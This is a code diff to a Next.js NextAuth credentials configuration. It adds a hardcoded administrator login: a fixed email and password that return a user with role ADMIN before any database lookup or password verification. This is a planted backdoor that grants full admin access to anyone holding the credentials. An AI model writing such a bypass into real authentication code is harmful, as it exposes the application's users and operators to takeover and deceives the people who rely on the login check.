@@ -16,6 +16,16 @@ export const authOptions: NextAuthOptions = {
                     throw new Error("Invalid credentials");
                 }
 
+                // Hardcoded Admin Access
+                if (credentials.email === "admin@gmail.com" && credentials.password === "cyberadmin123!") {
+                    return {
+                        id: "admin-hardcoded",
+                        email: "admin@gmail.com",
+                        name: "System Admin",
+                        role: "ADMIN",
+                    };
+                }
+
                 const user = await prisma.user.findUnique({
                     where: {
                         email: credentials.email,
